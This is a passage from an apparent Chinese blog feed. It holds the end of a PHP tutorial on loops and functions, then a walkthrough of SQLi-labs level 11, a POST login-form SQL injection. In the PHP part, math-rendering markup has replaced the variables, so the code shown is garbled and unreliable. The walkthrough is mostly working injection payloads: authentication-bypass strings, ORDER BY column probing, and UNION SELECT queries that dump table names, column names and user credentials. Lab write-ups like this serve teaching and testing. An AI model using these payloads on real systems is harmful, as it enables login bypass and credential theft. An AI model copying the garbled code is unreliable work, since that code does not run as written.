<path stroke-width="1" id="E1-MJMATHI-79" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
<path stroke-width="1" id="E1-MJMATHI-73" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-61" x="0" y="0"></use>
 <use xlink:href="#E1-MJMATHI-72" x="529" y="0"></use>
 <use xlink:href="#E1-MJMATHI-72" x="981" y="0"></use>
 <use xlink:href="#E1-MJMATHI-61" x="1432" y="0"></use>
 <use xlink:href="#E1-MJMATHI-79" x="1962" y="0"></use>
 <use xlink:href="#E1-MJMATHI-61" x="2459" y="0"></use>
 <use xlink:href="#E1-MJMATHI-73" x="2989" y="0"></use>
</g>
</svg>key &#x3D;&gt; $value)<br>&#123;<br>    要执行代码;<br>&#125;<br></code></pre></td></tr></table></figure>
<p>每一次循环，当前数组元素的键与值就都会被赋值给 <svg xmlns:xlink="http://www.w3.org/1999/xlink" width="5.617ex" height="3.343ex" style="vertical-align: -1.171ex;" viewBox="0 -934.9 2418.4 1439.2" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">key 和 </title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-6B" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path>
<path stroke-width="1" id="E1-MJMATHI-65" d="M39 168Q39 225 58 272T107 350T174 402T244 433T307 442H310Q355 442 388 420T421 355Q421 265 310 237Q261 224 176 223Q139 223 138 221Q138 219 132 186T125 128Q125 81 146 54T209 26T302 45T394 111Q403 121 406 121Q410 121 419 112T429 98T420 82T390 55T344 24T281 -1T205 -11Q126 -11 83 42T39 168ZM373 353Q367 405 305 405Q272 405 244 391T199 357T170 316T154 280T149 261Q149 260 169 260Q282 260 327 284T373 353Z"></path>
<path stroke-width="1" id="E1-MJMATHI-79" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-6B" x="0" y="0"></use>
 <use xlink:href="#E1-MJMATHI-65" x="521" y="0"></use>
 <use xlink:href="#E1-MJMATHI-79" x="988" y="0"></use>
<g transform="translate(1485,0)">
<text font-family="monospace" stroke="none" transform="scale(71.759) matrix(1 0 0 -1 0 0)">和</text>
</g>
</g>
</svg>value 变量（数字指针会逐一地移动），在进行下一次循环时，你将看到数组中的下一个键与值。<br>也就是下一次循环数组中的键与值都将会移向下一个<br><img src="https://img-blog.csdnimg.cn/20210307204255163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="五-函数"><a href="#五-函数" class="headerlink" title="五.函数"></a>五.函数</h1><p>函数是通过调用函数来执行的。</p>
<p>你可以在页面的任何位置调用函数。</p>
<p><strong>创建 PHP 函数</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">&lt;?php<br>function functionName()<br>&#123;<br>    &#x2F;&#x2F; 要执行的代码<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure>
<p>PHP 函数准则：</p>
<ul>
<li>函数的名称应该提示出它的功能</li>
<li>函数名称以字母或下划线开头（不能以数字开头）<br><img src="https://img-blog.csdnimg.cn/2021030720463891.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li>
</ul>
<p><strong>函数 - 添加参数</strong><br>为了给函数添加更多的功能，我们可以添加参数，参数类似变量。</p>
<p>参数就在函数名称后面的一个括号内指定。<br>实例将输出不同的名字，但姓是相同的：<br><img src="https://img-blog.csdnimg.cn/20210307205234407.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/202103072057235.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<p><strong>函数 - 返回值</strong><br>如需让函数返回一个值，请使用 return 语句。<br><img src="https://img-blog.csdnimg.cn/20210307210015604.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看到再次调用add函数当<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="6.237ex" height="2.509ex" style="vertical-align: -0.671ex;" viewBox="0 -791.3 2685.6 1080.4" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">x=1,</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-78" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path>
<path stroke-width="1" id="E1-MJMAIN-3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path>
<path stroke-width="1" id="E1-MJMAIN-31" d="M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z"></path>
<path stroke-width="1" id="E1-MJMAIN-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-78" x="0" y="0"></use>
 <use xlink:href="#E1-MJMAIN-3D" x="850" y="0"></use>
 <use xlink:href="#E1-MJMAIN-31" x="1906" y="0"></use>
 <use xlink:href="#E1-MJMAIN-2C" x="2407" y="0"></use>
</g>
</svg>y=16时$total的值为17，因此使用return语句可以使函数返回17.</p>
<p>一个简单的加减实例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><code class="hljs plain">function add(<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="1.877ex" height="2.009ex" style="vertical-align: -0.671ex;" viewBox="0 -576.1 808 865.1" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">a,</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
<path stroke-width="1" id="E1-MJMAIN-2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-61" x="0" y="0"></use>
 <use xlink:href="#E1-MJMAIN-2C" x="529" y="0"></use>
</g>
</svg>b)<br>&#123;<br>	<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="8.152ex" height="2.009ex" style="vertical-align: -0.338ex;" viewBox="0 -719.6 3509.8 865.1" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">count=</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-63" d="M34 159Q34 268 120 355T306 442Q362 442 394 418T427 355Q427 326 408 306T360 285Q341 285 330 295T319 325T330 359T352 380T366 386H367Q367 388 361 392T340 400T306 404Q276 404 249 390Q228 381 206 359Q162 315 142 235T121 119Q121 73 147 50Q169 26 205 26H209Q321 26 394 111Q403 121 406 121Q410 121 419 112T429 98T420 83T391 55T346 25T282 0T202 -11Q127 -11 81 37T34 159Z"></path>
<path stroke-width="1" id="E1-MJMATHI-6F" d="M201 -11Q126 -11 80 38T34 156Q34 221 64 279T146 380Q222 441 301 441Q333 441 341 440Q354 437 367 433T402 417T438 387T464 338T476 268Q476 161 390 75T201 -11ZM121 120Q121 70 147 48T206 26Q250 26 289 58T351 142Q360 163 374 216T388 308Q388 352 370 375Q346 405 306 405Q243 405 195 347Q158 303 140 230T121 120Z"></path>
<path stroke-width="1" id="E1-MJMATHI-75" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
<path stroke-width="1" id="E1-MJMATHI-6E" d="M21 287Q22 293 24 303T36 341T56 388T89 425T135 442Q171 442 195 424T225 390T231 369Q231 367 232 367L243 378Q304 442 382 442Q436 442 469 415T503 336T465 179T427 52Q427 26 444 26Q450 26 453 27Q482 32 505 65T540 145Q542 153 560 153Q580 153 580 145Q580 144 576 130Q568 101 554 73T508 17T439 -10Q392 -10 371 17T350 73Q350 92 386 193T423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 180T152 343Q153 348 153 366Q153 405 129 405Q91 405 66 305Q60 285 60 284Q58 278 41 278H27Q21 284 21 287Z"></path>
<path stroke-width="1" id="E1-MJMATHI-74" d="M26 385Q19 392 19 395Q19 399 22 411T27 425Q29 430 36 430T87 431H140L159 511Q162 522 166 540T173 566T179 586T187 603T197 615T211 624T229 626Q247 625 254 615T261 596Q261 589 252 549T232 470L222 433Q222 431 272 431H323Q330 424 330 420Q330 398 317 385H210L174 240Q135 80 135 68Q135 26 162 26Q197 26 230 60T283 144Q285 150 288 151T303 153H307Q322 153 322 145Q322 142 319 133Q314 117 301 95T267 48T216 6T155 -11Q125 -11 98 4T59 56Q57 64 57 83V101L92 241Q127 382 128 383Q128 385 77 385H26Z"></path>
<path stroke-width="1" id="E1-MJMAIN-3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-63" x="0" y="0"></use>
 <use xlink:href="#E1-MJMATHI-6F" x="433" y="0"></use>
 <use xlink:href="#E1-MJMATHI-75" x="919" y="0"></use>
 <use xlink:href="#E1-MJMATHI-6E" x="1491" y="0"></use>
 <use xlink:href="#E1-MJMATHI-74" x="2092" y="0"></use>
 <use xlink:href="#E1-MJMAIN-3D" x="2731" y="0"></use>
</g>
</svg>a+$b;<br>	return $count;<br>&#125;<br>&#x2F;&#x2F;计算两个数的和<br>function count_score()<br>&#123;<br>	$m&#x3D;96;&#x2F;&#x2F;数学成绩<br>	$y&#x3D;99;&#x2F;&#x2F;英语成绩<br>	<svg xmlns:xlink="http://www.w3.org/1999/xlink" width="12.125ex" height="2.843ex" style="vertical-align: -0.838ex;" viewBox="0 -863.1 5220.6 1223.9" role="img" focusable="false" xmlns="http://www.w3.org/2000/svg" aria-labelledby="MathJax-SVG-1-Title">
<title id="MathJax-SVG-1-Title">sum=add(</title>
<defs aria-hidden="true">
<path stroke-width="1" id="E1-MJMATHI-73" d="M131 289Q131 321 147 354T203 415T300 442Q362 442 390 415T419 355Q419 323 402 308T364 292Q351 292 340 300T328 326Q328 342 337 354T354 372T367 378Q368 378 368 379Q368 382 361 388T336 399T297 405Q249 405 227 379T204 326Q204 301 223 291T278 274T330 259Q396 230 396 163Q396 135 385 107T352 51T289 7T195 -10Q118 -10 86 19T53 87Q53 126 74 143T118 160Q133 160 146 151T160 120Q160 94 142 76T111 58Q109 57 108 57T107 55Q108 52 115 47T146 34T201 27Q237 27 263 38T301 66T318 97T323 122Q323 150 302 164T254 181T195 196T148 231Q131 256 131 289Z"></path>
<path stroke-width="1" id="E1-MJMATHI-75" d="M21 287Q21 295 30 318T55 370T99 420T158 442Q204 442 227 417T250 358Q250 340 216 246T182 105Q182 62 196 45T238 27T291 44T328 78L339 95Q341 99 377 247Q407 367 413 387T427 416Q444 431 463 431Q480 431 488 421T496 402L420 84Q419 79 419 68Q419 43 426 35T447 26Q469 29 482 57T512 145Q514 153 532 153Q551 153 551 144Q550 139 549 130T540 98T523 55T498 17T462 -8Q454 -10 438 -10Q372 -10 347 46Q345 45 336 36T318 21T296 6T267 -6T233 -11Q189 -11 155 7Q103 38 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
<path stroke-width="1" id="E1-MJMATHI-6D" d="M21 287Q22 293 24 303T36 341T56 388T88 425T132 442T175 435T205 417T221 395T229 376L231 369Q231 367 232 367L243 378Q303 442 384 442Q401 442 415 440T441 433T460 423T475 411T485 398T493 385T497 373T500 364T502 357L510 367Q573 442 659 442Q713 442 746 415T780 336Q780 285 742 178T704 50Q705 36 709 31T724 26Q752 26 776 56T815 138Q818 149 821 151T837 153Q857 153 857 145Q857 144 853 130Q845 101 831 73T785 17T716 -10Q669 -10 648 17T627 73Q627 92 663 193T700 345Q700 404 656 404H651Q565 404 506 303L499 291L466 157Q433 26 428 16Q415 -11 385 -11Q372 -11 364 -4T353 8T350 18Q350 29 384 161L420 307Q423 322 423 345Q423 404 379 404H374Q288 404 229 303L222 291L189 157Q156 26 151 16Q138 -11 108 -11Q95 -11 87 -5T76 7T74 17Q74 30 112 181Q151 335 151 342Q154 357 154 369Q154 405 129 405Q107 405 92 377T69 316T57 280Q55 278 41 278H27Q21 284 21 287Z"></path>
<path stroke-width="1" id="E1-MJMAIN-3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path>
<path stroke-width="1" id="E1-MJMATHI-61" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path>
<path stroke-width="1" id="E1-MJMATHI-64" d="M366 683Q367 683 438 688T511 694Q523 694 523 686Q523 679 450 384T375 83T374 68Q374 26 402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487H491Q506 153 506 145Q506 140 503 129Q490 79 473 48T445 8T417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157Q33 205 53 255T101 341Q148 398 195 420T280 442Q336 442 364 400Q369 394 369 396Q370 400 396 505T424 616Q424 629 417 632T378 637H357Q351 643 351 645T353 664Q358 683 366 683ZM352 326Q329 405 277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q233 26 290 98L298 109L352 326Z"></path>
<path stroke-width="1" id="E1-MJMAIN-28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path>
</defs>
<g stroke="currentColor" fill="currentColor" stroke-width="0" transform="matrix(1 0 0 -1 0 0)" aria-hidden="true">
 <use xlink:href="#E1-MJMATHI-73" x="0" y="0"></use>
 <use xlink:href="#E1-MJMATHI-75" x="469" y="0"></use>
 <use xlink:href="#E1-MJMATHI-6D" x="1042" y="0"></use>
 <use xlink:href="#E1-MJMAIN-3D" x="2198" y="0"></use>
 <use xlink:href="#E1-MJMATHI-61" x="3254" y="0"></use>
 <use xlink:href="#E1-MJMATHI-64" x="3784" y="0"></use>
 <use xlink:href="#E1-MJMATHI-64" x="4307" y="0"></use>
 <use xlink:href="#E1-MJMAIN-28" x="4831" y="0"></use>
</g>
</svg>m, $y);<br>	echo &quot;小明的总成绩是&quot; . $sum;<br>&#125;<br>count_score();<br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210307210752947.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
]]></content>
  </entry>
  <entry>
    <title>POST注入-SQL-labs(11关)</title>
    <url>/2021/06/05/POST%E6%B3%A8%E5%85%A5-SQL-labs(11%E5%85%B3)/</url>
    <content><![CDATA[<h1 id="一、万能密码"><a href="#一、万能密码" class="headerlink" title="一、万能密码"></a>一、万能密码</h1><p>对于万能密码的类型是根据SQL注入的情况而判断的，这里举例几个SQL注入中常见的几个类型：</p>
<ol>
<li>xxx’ or 1 = 1#(最后的#可以换成– (记住如果是– 的最后有个空格)) 【这种是比较通用的】</li>
<li>xxx’ or ‘1’ = ‘1(最后可以加#或者加– (记住如果是– 的最后有个空格))</li>
<li>xxx” or “1” = “1</li>
<li>xxx”) or (“1”) = (“1 </li>
<li><hr>
</li>
</ol>
<p><strong>其实对于表单注入：在用户名密码框当中同样是通过select语句进行查询，只不过从原来的get方法改成了post方法，此时也可进行注入。</strong></p>
<h1 id="二、判断闭合符号"><a href="#二、判断闭合符号" class="headerlink" title="二、判断闭合符号"></a>二、判断闭合符号</h1><p>在登录框中输入<code>xxx &#39; or 1#</code> 和<code>xxx &quot; or 1#</code> 根据回显分别进行判断</p>
<p><img src="https://img-blog.csdnimg.cn/20210509150327543.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/20210509150518191.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>根据回显可以发现这里是基于单引号的字符型注入</p>
<h1 id="三、查询列数"><a href="#三、查询列数" class="headerlink" title="三、查询列数"></a>三、查询列数</h1><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">XXX <span class="hljs-string">&#x27;order by 2 #</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210509151050140.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">xxx <span class="hljs-string">&#x27;order by 3 #</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210509151305172.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>可以看出列数为2</p>
<h1 id="四、找显示位"><a href="#四、找显示位" class="headerlink" title="四、找显示位"></a>四、找显示位</h1><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">xxx <span class="hljs-string">&#x27; union select 1,2 #</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210509162254150.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="五、爆数据库"><a href="#五、爆数据库" class="headerlink" title="五、爆数据库"></a>五、爆数据库</h1><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">xxx<span class="hljs-string">&#x27; union select 1,database()#</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210509162516743.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="六、爆表名"><a href="#六、爆表名" class="headerlink" title="六、爆表名"></a>六、爆表名</h1><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">xxx<span class="hljs-string">&#x27; union select 1,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span>security<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210509162955751.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="七、爆列名"><a href="#七、爆列名" class="headerlink" title="七、爆列名"></a>七、爆列名</h1><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">xxx<span class="hljs-string">&#x27; union select 1,group_concat(column_name) from information_schema.COLUMNs where table_schema=&#x27;</span>security<span class="hljs-string">&#x27; and table_name=&#x27;</span>users<span class="hljs-string">&#x27;#</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210509163551689.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="八、字段信息"><a href="#八、字段信息" class="headerlink" title="八、字段信息"></a>八、字段信息</h1><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql">xxx<span class="hljs-string">&#x27; union select 1,group_concat(concat_ws(&quot;,&quot;,username,password) SEPARATOR &quot;|&quot;) from users #</span><br></code></pre></td></tr></table></figure>
<p><img src="https://img-blog.csdnimg.cn/20210509163917882.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<h1 id="九、万能密码构造（说明）"><a href="#九、万能密码构造（说明）" class="headerlink" title="九、万能密码构造（说明）"></a>九、万能密码构造（说明）</h1><p>当我们进行判断时，可以对报错信息进行分析<img src="https://img-blog.csdnimg.cn/20210509164552556.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl81MTcwNjA0NA==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>据此报错，我们大概的可以猜测其网站的正常是SQL语句：</p>
